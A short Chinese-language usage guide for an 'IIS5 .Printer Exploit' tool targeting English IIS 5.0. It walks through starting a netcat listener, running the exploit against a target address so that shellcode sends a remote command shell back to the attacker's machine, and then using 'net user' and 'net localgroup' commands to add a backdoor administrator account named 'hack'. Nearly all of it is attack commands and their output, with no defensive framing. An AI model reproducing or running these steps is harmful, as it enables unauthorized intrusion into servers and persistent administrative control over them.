                IIS5 .Printer Exploit 使用说明

                   本程序适用于英文版IIS 5.0

1、首先在本机用NC开一个监听端口。

C:\>nc -l -p 99

2、运行IIS5Exploit

D:\>IIS5Exploit xxx.xxx.xxx.xxx 211.152.188.1 99

===========IIS5 English Version .Printer Exploit.===========
===Written by Assassin 1995-2001. http://www.netXeyes.com===

Connecting 211.152.188.1 ...OK.
Send Shell Code ...OK
IIS5 Shell Code Send OK

其中211.152.188.1指向本地IP。

稍等片刻，如果成功在本机NC舰艇的端口出现：

C:\>nc -l -p 99
Microsoft Windows 2000[Version 5.00.2195]
(C) Copyright 1985-1999 Microsoft Corp.

C:\>

可以执行命令。如：

C:\>net user hack password /add

The command completed successfully.

C:\>net localgroup administrartors hack /add

这样就创建了一个属于Administrator组的用户Hack,密码为password.